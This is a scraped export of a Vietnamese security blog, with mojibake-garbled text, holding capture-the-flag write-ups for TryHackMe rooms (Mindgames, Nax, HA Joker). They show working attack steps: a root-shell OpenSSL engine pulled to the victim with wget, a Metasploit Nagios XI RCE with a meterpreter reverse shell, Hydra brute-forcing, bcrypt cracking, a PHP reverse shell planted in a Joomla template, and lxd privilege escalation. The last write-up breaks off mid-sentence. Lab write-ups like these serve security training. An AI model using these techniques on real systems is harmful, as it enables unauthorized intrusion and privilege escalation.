thÃ¡c dá»±a trÃªn blog Engine Building Lesson 1: A Minimum Useless Engine\n#include \u0026lt;openssl/engine.h\u0026gt; static int bind(ENGINE *e, const char *id) { setuid(0); system(\u0026#34;/bin/sh\u0026#34;); } IMPLEMENT_DYNAMIC_BIND_FN(bind) IMPLEMENT_DYNAMIC_CHECK_FN() gcc -fPIC -o silly-engine.o -c silly-engine.c gcc -shared -o silly-engine.so -lcrypto silly-engine.o Äáº©y file silly-engine.so lÃªn mÃ¡y victim\npython -m http.server 8888 PhÃ­a victim\nmindgames@mindgames:~/webserver$ wget http://10.8.105.194:8888/silly-engine.so \u0026lt;rver$ wget http://10.8.105.194:8888/silly-engine.so --2023-07-22 19:39:29-- http://10.8.105.194:8888/silly-engine.so Connecting to 10.8.105.194:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 15664 (15K) [application/octet-stream] Saving to: â€˜silly-engine.soâ€™ silly-engine.so 100%[===================\u0026gt;] 15.30K 69.9KB/s in 0.2s 2023-07-22 19:39:29 (69.9 KB/s) - â€˜silly-engine.soâ€™ saved [15664/15664] mindgames@mindgames:~/webserver$ openssl req -engine ./silly-engine.so openssl req -engine ./silly-engine.so # id id uid=0(root) gid=1001(mindgames) groups=1001(mindgames) # bash bash root@mindgames:~/webserver# cat /root/root.txt cat /root/root.txt thm{1974a617cc84c5b51411c283544ee254} root@mindgames:~/webserver# ","date":"10 May 2022","externalUrl":null,"permalink":"/ctf/tryhackme/mindgames/","section":"Ctf","summary":"","title":"Tryhackme - Mindgames","type":"ctf"},{"content":"","date":"5 May 2022","externalUrl":null,"permalink":"/tags/nagios/","section":"Tags","summary":"","title":"Nagios","type":"tags"},{"content":"","date":"5 May 2022","externalUrl":null,"permalink":"/tags/ppm/","section":"Tags","summary":"","title":"Ppm","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe - Nax\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCw9lXSbmWYgGcDpP5NiHE9MMRQktk72HpmKY50dVs/GbfJMNa29eJNKsZ2XfAVsGUuxRdX42/fvaAUOoSZlNlARJUOhS+3fRX14Qx9itHqEoYTXXnSZ+lYc4HGbMkbGlbW3CqQ6zxO9kEbe8DbFi9BPkGOvjMk5mrVYqOpROlZwJvwCtK4g+LNkZibj3VZvZ+Ex410r4Xqd4TeIe+NRVmCEG5I57w60wZTwS6WAhQ86Td8ZhDr0hlN82vKe8KK8Q6Qyt4NNa4GrwJAil0DMSSrSdgiFPWfSBN0RcaGq6xTyd3m4bUmKfqSJ+hhvpoQ5CJNQK5dtIfLulV5iEVWXKtV | 256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA6AY/MaydX6jLtiYXUhTaSQuNB4h08nsJd8MIxQ4b77d5qBK89b0rXrmxH8TavI5HpHOnAYeSMWcgrWcKAnBXk= | 256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcps6PPy9z/iS7bgKohT/GXERf6a6hWzhuWyeNMtzcw 25/tcp open smtp syn-ack ttl 63 Postfix smtpd | ssl-cert: Subject: commonName=ubuntu | Issuer: commonName=ubuntu | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-03-23T23:42:04 | Not valid after: 2030-03-21T23:42:04 | MD5: 9b85:15ad:46a7:016e:319a:033d:7d96:edbe | SHA-1: c488:0c2d:a210:38dd:cfbb:a299:4a2a:b69c:63fd:2cdc | -----BEGIN CERTIFICATE----- | MIICsjCCAZqgAwIBAgIJAMztBzdUafrfMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV | BAMMBnVidW50dTAeFw0yMDAzMjMyMzQyMDRaFw0zMDAzMjEyMzQyMDRaMBExDzAN | BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM4f | Mj+6LmA7krMf32EdXKtdfPVFVFf3367a+trh4/H6MHZJVOpZ+CrH1j4RTjr9SONC | l5Fzrz1hR1o1oXIwsAXrtqcvYGeNT7gwH4D6m6zifSaOAWEy/IMsbe3+sPMIUPlS | 4NdFl4J6PeyeAAnShUzAOAdUqsvSsAmmvN3ze+Y2OGGfOlO1s7n25FDs72zXo2nX | i1EO+1mVdUWuM/Qr8Zctilwv9QNPWxcoTG/Zac/q8/pboWaUg3pf6mfFLbwo96ba | 8p8QR8gfD1Vc1xQMN98/2lPxo8ISkW9ffcBzy0ILIhkSD/8EmynmC7FhgogCU+/l | fYpeC3wLLigkDZnOgL0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF | AAOCAQEABDjkkOLVJfqNq1qSDGBgu7IJCG1CAByl82DGlam2nsVBhji54hviiyBi | euCyeqJRPOX2qS7Kl0scMFw+DVxNW867HcrtTYEHuo1gOCGX3QFz+eUuKf+4X1Wr | a7VgSeYVhboT4w4tKm8Rprh7QkHp9MNTB9TR/edG9RtFJZXtSlykeS5lLeC3DjRw | 0NhWpgG2ZLa9URDrpzErvVwOBN46IS0PqwDCxJSvsH6sBQhgrm5so71jrPHwmh/o | aaqO96Rw+1aRRLwz0O0TEO4aMw8/seeiRJ8w4kXMOy9UrCM5+yW6fbtMKYsmEPJO | RxSanrURYb9UJxdRfeWPqWYU1AHVwg== |_-----END CERTIFICATE----- |_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug) |_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN |_ssl-date: TLS randomness does not represent time 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 389/tcp open ldap syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul | Issuer: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2020-03-24T00:14:58 | Not valid after: 2030-03-22T00:14:58 | MD5: 636c:ab0f:6399:34e3:b6de:e6e2:b294:d4ef | SHA-1: 80cd:2e1b:110f:1b5f:1943:1b3f:c218:71e7:8b98:6801 | -----BEGIN CERTIFICATE----- | MIIDzTCCArWgAwIBAgIBADANBgkqhkiG9w0BAQUFADCBgDELMAkGA1UEBhMCVVMx | EjAQBgNVBAgMCU1pbm5lc290YTERMA8GA1UEBwwIU3QuIFBhdWwxGzAZBgNVBAoM | Ek5hZ2lvcyBFbnRlcnByaXNlczEUMBIGA1UECwwLRGV2ZWxvcG1lbnQxFzAVBgNV | BAMMDjE5Mi4xNjguODUuMTUzMB4XDTIwMDMyNDAwMTQ1OFoXDTMwMDMyMjAwMTQ1 | OFowgYAxCzAJBgNVBAYTAlVTMRIwEAYDVQQIDAlNaW5uZXNvdGExETAPBgNVBAcM | CFN0LiBQYXVsMRswGQYDVQQKDBJOYWdpb3MgRW50ZXJwcmlzZXMxFDASBgNVBAsM | C0RldmVsb3BtZW50MRcwFQYDVQQDDA4xOTIuMTY4Ljg1LjE1MzCCASIwDQYJKoZI | hvcNAQEBBQADggEPADCCAQoCggEBANdnw2CkJpNnnwjJ+PaxonTH/G5TSKLru67c | aQyy4FhI/xa+0Dwn/HjWnWIOE3gOQB7QyOyG30guUpFohUEtC9agL7tpogpxrV8l | ie0vhXsz0ETdzMhaou6QOrLS1OSspAh+t492t71BILl6ReHPLoFyEghyRctP/iK0 | PelUJKndJ2ElpLdbkMUuVzQ9mp8qIjoTF4CS1JwiUESCtikRmZWp398buklzNGgF | VZIRJPu5VZMPGc7Ui3QUSaTF2aqi9FRXZRXN+0q2nWvdUFrUqnzrmaVynOupGXhS | O17VZtC9F/GM+yWpg3Lck9wevt5o3nnYW4k8h5kDNHu4f0oDR88CAwEAAaNQME4w | HQYDVR0OBBYEFFRhBQ3MZkrfjRqOlHjApJZAN+juMB8GA1UdIwQYMBaAFFRhBQ3M | ZkrfjRqOlHjApJZAN+juMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEB | ABeWyFzGfxf3vmGuLXdDXVj5e1LwBlvoNmHGf11Buy/yljpUI6jg1HxUTSABU/iS | ZSsCnwOQ5dtqRAIcvFp07ZlUw9DpeSChj2jxXw+YxINOSqqNgE66zelXV9rJb7TX | HWho2/g6OzKs5ii2h5lyjlValQAgfxBYJpRjvf4FfIJpzL+RnrsOqJBNUurbAn1L | yNkqSDJhCPNN/g0V6eyOZRjTipV2FzcHYrbt84qFPN8gQ5Rpd6wNOWoUfuY1tL6H | yepaZ/iLv+wY60Kxd8+GD4Oy7Tpz+Ilkr48EIUffejHzVrcn7JikS8+Uf8nvDi9Q | LnC7LykFocxS13IXPcTfrnI= |_-----END CERTIFICATE----- |_http-title: 400 Bad Request |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_ssl-date: TLS randomness does not represent time 5667/tcp open tcpwrapped syn-ack ttl 63 Service Info: Host: ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel CÃ³ khÃ¡ nhiá»u port Ä‘ang má»Ÿ, nhÆ°ng tÃ´i sáº½ thá»­ Ä‘i qua cÃ¡c port cá»§a web service trÆ°á»›c lÃ  80 vÃ  443. Truy cáº­p vÃ o trang web, tÃ´i nháº­n Ä‘Æ°á»£c má»™t vÃ i gá»£i Ã½ (hoáº·c Ã­t nháº¥t lÃ  tÃ´i nghÄ© váº­y)\nWelcome to elements. Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr CÃ³ thá»ƒ nháº­n ra ngay Ä‘Ã¢y lÃ  cÃ¡c kÃ½ hiá»‡u Ä‘áº¡i diá»‡n cá»§a cÃ¡c nguyÃªn tá»‘ trong báº£ng tuáº§n hoÃ n hÃ³a há»c. Má»—i nguyÃªn tá»‘ Ä‘á»u cÃ³ sá»‘ hiá»‡u nguyÃªn tá»­ riÃªng. TÃ´i cÃ³ thá»ƒ dá»±a vÃ o nÃ³ Ä‘á»ƒ táº¡o ra 1 dÃ£y sá»‘ má»›i\nAg - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr 47 80 73 51 84 46 80 78 103 Convert dÃ£y sá»‘ trÃªn thÃ nh ascii, tÃ´i cÃ³ hidden file\nPI3T.\nTáº£i file áº£nh nÃ y vá» vÃ  dÃ¹ng exiftool Ä‘á»ƒ phÃ¢n tÃ­ch\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# exiftool Downloads/PI3T. ExifTool Version Number : 12.57 File Name : PI3T. Directory : Downloads File Size : 982 kB File Modification Date/Time : 2023:07:21 13:50:34-04:00 File Access Date/Time : 2023:07:21 13:50:34-04:00 File Inode Change Date/Time : 2023:07:21 13:50:34-04:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 990 Image Height : 990 Bit Depth : 8 Color Type : Palette Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Palette : (Binary data 768 bytes, use -b option to extract) Transparency : (Binary data 256 bytes, use -b option to extract) Artist : Piet Mondrian Copyright : Piet Mondrian, tryhackme 2020 Image Size : 990x990 Megapixels : 0.980 á» Ä‘Ã¢y tÃ´i cÃ³ ngÆ°á»i táº¡o ra file nÃ y\nPiet Mondrian\nTiáº¿p theo tÃ´i cáº§n convert file áº£nh nÃ y sang ppm. CÃ³ thá»ƒ dÃ¹ng cÃ¡c web convert trÃªn máº¡ng vÃ­ dá»¥ nhÆ° Convertio â€” File Converter\nMáº¥t má»™t lÃºc tÃ¬m kiáº¿m xung quanh cÃ¡i tÃªn Piet vÃ  ppm format thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c má»™t cÃ´ng cá»¥, hay Ä‘Ãºng hÆ¡n lÃ  ngÃ´n ngá»¯ láº­p trÃ¬nh mÃ u sáº¯c\nTáº£i nÃ³ vá» vÃ  giáº£i nÃ©n\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ./npiet /Downloads/PI3T.ppm nagiosadmin%n3p3UQ\u0026amp;9BjLp4$7uhWdYnagiosadmin%n3p3UQ\u0026amp;9BjLp4$7uhWdYnagiosadmin username: nagiosadmin password: n3p3UQ\u0026amp;9BjLp4$7uhWdY\nThá»­ truy cáº­p nagios\nNgay trÃªn trang chá»§ cá»§a Nagios cÃ³ hiá»‡n phiÃªn báº£n hiá»‡n táº¡i lÃ  4.4.2. Thá»­ tÃ¬m cÃ¡c lá»— há»•ng vá»›i Nagios 4.4.2 vÃ  tÃ´i tÃ¬m tháº¥y CVE-2019-15949\nSá»­ dá»¥ng Metasploit Ä‘á»ƒ tÃ¬m CVE nÃ y, tÃ´i tÃ¬m Ä‘Æ°á»£c module\nexploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce)\nCáº¥u hÃ¬nh cÃ¡c thÃ´ng sá»‘ trong exploit\nmsf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) \u0026gt; show options Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce): Name Current Setting Required Description ---- --------------- -------- ----------- FINISH_INSTALL false no If the Nagios XI installation has not been completed, try to do so. This includes signing the license agreement. PASSWORD n3p3UQ\u0026amp;9BjLp4$7uhWdY yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.208.133 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /nagiosxi/ yes The base path to the Nagios XI application URIPATH no The URI to use for this exploit (default is random) USERNAME nagiosadmin yes Username to authenticate with VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.8.105.194 yes The listen address (an interface may be specified) LPORT 6666 yes The listen port Exploit target: Id Name -- ---- 1 Linux (x64) View the full module info with the info, or info -d command. msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) \u0026gt; run [*] Started reverse TCP handler on 10.8.105.194:6666 [*] Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [*] Attempting to authenticate to Nagios XI... [+] Successfully authenticated to Nagios XI. [*] Target is Nagios XI with version 5.5.6. [+] The target appears to be vulnerable. [*] Uploading malicious \u0026#39;check_ping\u0026#39; plugin... [*] Command Stager progress - 100.00% done (897/897 bytes) [+] Successfully uploaded plugin. [*] Executing plugin... [*] Waiting up to 300 seconds for the plugin to request the final payload... [*] Sending stage (3045348 bytes) to 10.10.208.133 [*] Meterpreter session 1 opened (10.8.105.194:6666 -\u0026gt; 10.10.208.133:56918) at 2023-07-21 16:32:40 -0400 [*] Deleting malicious \u0026#39;check_ping\u0026#39; plugin... [+] Plugin deleted. meterpreter \u0026gt; shell Process 2440 created. Channel 1 created. id uid=0(root) gid=0(root) groups=0(root) cd /root pwd /root ls -la total 28 drwx------ 4 root root 4096 Mar 24 2020 . drwxr-xr-x 23 root root 4096 Mar 23 2020 .. -rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc drwxr-xr-x 2 root root 4096 Mar 24 2020 .nano -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 38 Mar 24 2020 root.txt drwxr-xr-x 2 root root 4096 Mar 23 2020 scripts cat root.txt THM{c89b2e39c83067503a6508b21ed6e962} ls -la /home total 12 drwxr-xr-x 3 root root 4096 Mar 23 2020 . drwxr-xr-x 23 root root 4096 Mar 23 2020 .. drwxr-xr-x 8 galand galand 4096 Mar 24 2020 galand ls -la /home/galand total 56 drwxr-xr-x 8 galand galand 4096 Mar 24 2020 . drwxr-xr-x 3 root root 4096 Mar 23 2020 .. -rw------- 1 root root 481 Mar 24 2020 .bash_history -rw-r--r-- 1 galand galand 220 Mar 23 2020 .bash_logout -rw-r--r-- 1 galand galand 3771 Mar 23 2020 .bashrc drwx------ 2 galand galand 4096 Mar 23 2020 .cache drwxr-xr-x 6 root root 4096 Mar 23 2020 .cpan drwx------ 2 root root 4096 Mar 23 2020 .gnupg drwxrwxr-x 2 galand galand 4096 Mar 24 2020 .nano -rw-r--r-- 1 galand galand 655 Mar 23 2020 .profile -rw------- 1 root root 1024 Mar 23 2020 .rnd drwxr-xr-x 3 root root 4096 Mar 23 2020 .subversion -rw-r--r-- 1 galand galand 0 Mar 23 2020 .sudo_as_admin_successful drwxr-xr-x 9 galand galand 4096 Mar 23 2020 nagiosxi -rw-rw-r-- 1 galand galand 38 Mar 24 2020 user.txt cat /home/galand/user.txt THM{84b17add1d72a9f2e99c33bc568ae0f1} ","date":"5 May 2022","externalUrl":null,"permalink":"/ctf/tryhackme/nax/","section":"Ctf","summary":"","title":"Tryhackme - Nax","type":"ctf"},{"content":"","date":"1 May 2022","externalUrl":null,"permalink":"/tags/hydra/","section":"Tags","summary":"","title":"Hydra","type":"tags"},{"content":"","date":"1 May 2022","externalUrl":null,"permalink":"/tags/lxd/","section":"Tags","summary":"","title":"Lxd","type":"tags"},{"content":"Xin chÃ o, láº¡i lÃ  tÃ´i Ä‘Ã¢y. HÃ´m nay tÃ´i sáº½ giáº£i CTF TryHackMe | HA Joker CTF\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ad201ff4331b0070b385cb8700c4f4f7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF | 256 1bf9a8ecfd35ecfb04d5ee2aa17a4f78 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ= | 256 dcd7dd6ef6711f8c2c2ca1346d299920 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-title: HA: Joker | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.29 (Ubuntu) 8080/tcp open http syn-ack Apache httpd 2.4.29 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Please enter the password. |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 401 Unauthorized Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel What version of Apache is it?: 2.4.29\nWhat port on this machine not need to be authenticated by user and password? 80\nVá»›i file áº©n, tÃ´i sá»­ dá»¥ng dirsearch vÃ  thÃªm extension txt, php, bak. Tá»“i tÃ¬m Ä‘Æ°á»£c path áº©n lÃ  secret.txt\nCÅ©ng báº±ng cÃ¡ch nÃ y tÃ´i tÃ¬m Ä‘Æ°á»£c file há»‡ thá»‘ng lÃ  phpinfo.php\nEnumeration # Khi chuyá»ƒn sang port 8080, tÃ´i cÃ³ username joker vÃ  pháº£i tÃ¬m password Ä‘á»ƒ Ä‘Äƒng nháº­p. Sau khi dÃ¹ng Burp Ä‘á»ƒ báº¯t request thÃ¬ tÃ´i nháº­n ra phÆ°Æ¡ng thá»©c Ä‘Æ°á»£c sá»­ dá»¥ng lÃ  http-get chá»© khÃ´ng pháº£i post\nSá»­ dá»¥ng hydra Ä‘á»ƒ bruteforce password cá»§a user joker\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ hydra -l joker -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt -s 8080 10.10.17.48 http-get Hydra v9.4 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). ... [DATA] max 16 tasks per 1 server, overall 16 tasks, 42660 login tries (l:1/p:42660), ~2667 tries per task [DATA] attacking http-get://10.10.17.48:8080/ [8080][http-get] host: 10.10.17.48 login: joker password: hannah Sau khi Ä‘Äƒng nháº­p thÃ nh cÃ´ng, tÃ´i Ä‘Æ°á»£c Ä‘Æ°a Ä‘áº¿n 1 trang blog sá»­ dá»¥ng Joomla CMS.\nThá»­ truy cáº­p vÃ o robots.txt tÃ´i tÃ¬m tháº¥y cÃ¡c path há»‡ thá»‘ng, 1 trong sá»‘ Ä‘Ã³ lÃ  /administrator/\nTuy nhiÃªn muá»‘n truy cáº­p vÃ o admin tÃ´i cÅ©ng pháº£i Ä‘Äƒng nháº­p. Äá»ƒ tÃ¬m xem cÃ³ gÃ¬ thÃº vá»‹ á»Ÿ path tÃ´i sáº½ sá»­ dá»¥ng láº¡i dirsearch vá»›i user password cá»§a joker\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirsearch -u 10.10.247.23:8080 --auth-type basic --auth joker:hannah -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e txt,bak,zip,php ... [22:45:51] 200 - 12MB - /backup ... TÃ´i tÃ¬m tháº¥y file backup.zip\nÄá»ƒ giáº£i nÃ©n thÃ¬ cáº§n pháº£i cÃ³ password vÃ  khi tÃ´i thá»­ password cá»§a joker lÃ  hannah thÃ¬ Ä‘Æ°á»£c luÃ´n. BÃªn trong backup tÃ´i cÃ³ file db vÃ  site backup.\nPhÃ¢n tÃ­ch file sql nÃ y tÃ´i tÃ¬m tháº¥y super duper user\nINSERT INTO `cc1gr_users` VALUES (547,\u0026#39;Super Duper User\u0026#39;,\u0026#39;admin\u0026#39;,\u0026#39;admin@example.com\u0026#39;,\u0026#39;$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG\u0026#39;,0,1,\u0026#39;2019-10-08 12:00:15\u0026#39;,\u0026#39;2019-10-25 15:20:02\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;{\\\u0026#34;admin_style\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;admin_language\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;language\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;editor\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;helpsite\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;timezone\\\u0026#34;:\\\u0026#34;\\\u0026#34;}\u0026#39;,\u0026#39;0000-00-00 00:00:00\u0026#39;,0,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,0); LÆ°u Ä‘oáº¡n hash nÃ y vÃ o 1 file vÃ  dÃ¹ng john Ä‘á»ƒ crack nÃ³\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/site] â””â”€$ john hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst abcd1234 (?) Sau khi Ä‘Äƒng nháº­p, tÃ´i cÃ³ giao diá»‡n quáº£n trá»‹ joomla. BÃ¢y giá» thÃ¬ upload revershell thÃ´i.\nExtensions -\u0026gt; Templates -\u0026gt; Templates -\u0026gt; beez3\nTÃ´i sáº½ xÃ³a háº¿t ná»™i dung vÃ  thay Ä‘á»•i báº±ng code shell cá»§a mÃ¬nh. Váº«n lÃ  shell php tháº§n thÃ¡nh cá»§a pentestmonkey thÃ´i.\nThay Ä‘á»•i giÃ¡ trá»‹ IP vÃ  Port thÃ nh mÃ¡y local cá»§a mÃ¬nh, sau Ä‘Ã³ save nÃ³ láº¡i. VÃ¬ tÃ´i thay Ä‘á»•i file index.php trong template beez3 nÃªn cÅ©ng pháº£i vÃ o url nÃ y thÃ¬ má»›i kÃ­ch hoáº¡t Ä‘Æ°á»£c shell. VÃ  táº¥t nhiÃªn trÆ°á»›c Ä‘Ã³ tÃ´i pháº£i táº¡o listener vá»›i port Ä‘Ã£ cáº¥u hÃ¬nh trong code shell\nhttp://IP:8080/templates/beez3/index.php\nQuay láº¡i listener\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.6.0.191] from (UNKNOWN) [10.10.198.35] 35612 Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 19:30:22 up 11 min, 0 users, load average: 0.00, 0.20, 0.27 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd) bash: cannot set terminal process group (632): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd) www-data@ubuntu:/$ Privilege escalation # TÃ´i Ä‘á»ƒ Ã½ user nÃ y cÃ³ trong group lxd. NÃ³i qua 1 chÃºt vá» lxd thÃ¬ nÃ³ giá»‘ng nhÆ° docker sá»­ dá»¥ng cÃ¡c container Ä‘á»ƒ Ä‘Ã³ng gÃ³i mÃ´i trÆ°á»ng, nhÆ°ng nháº¹ hÆ¡n vÃ  cho tá»‘c Ä‘á»™ cao hÆ¡n.\nTÃ´i sáº½ sá»­ dá»¥ng cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i lxd Ä‘Æ°á»£c trÃ¬nh bÃ y á»Ÿ Ä‘Ã¢y\nÄáº§u tiÃªn táº¡o image má»›i trÃªn mÃ¡y local\ngit clone https://github.com/saghul/lxd-alpine-builder.git\ncd lxd-alpine-builder\nsudo ./build-alpine\nSau khi thá»±c hiá»‡n build xong, kiá»ƒm tra láº¡i file .tar.gz vá»«a táº¡o\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/lxd-alpine-builder] â””â”€$ ll total 3732 -rw-r--r-- 1 root root 3776904 Dec 26 23:08 alpine-v3.17-x86_64-20221226_2308.tar.gz -rwxr-xr-x 1 kali kali 8060 Dec 26 23:06 build-alpine -rw-r--r-- 1 kali kali 26530 Dec 26 23:06 LICENSE -rw-r--r-- 1 kali kali 768 Dec 26 23:06 README.md Sau Ä‘Ã³ táº¡o http local server trÃªn mÃ¡y local vÃ  tá»« mÃ¡y remote thá»±c hiá»‡n láº¥y file alpine vá»«a táº¡o\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/lxd-alpine-builder] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) www-data@ubuntu:/tmp$ wget http://10.6.0.191:8000/alpine-v3.17-x86_64-20221226_2308.tar.gz \u0026lt;0.191:8000/alpine-v3.17-x86_64-20221226_2308.tar.gz http://10.6.0.191:8000/alpine-v3.17-x86_64-20221226_2308.tar.gz Connecting to 10.6.0.191:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 3776904 (3.6M) [application/gzip] Saving to: \u0026#39;alpine-v3.17-x86_64-20221226_2308.tar.gz\u0026#39; Import image má»›i nÃ y vá»›i tÃªn 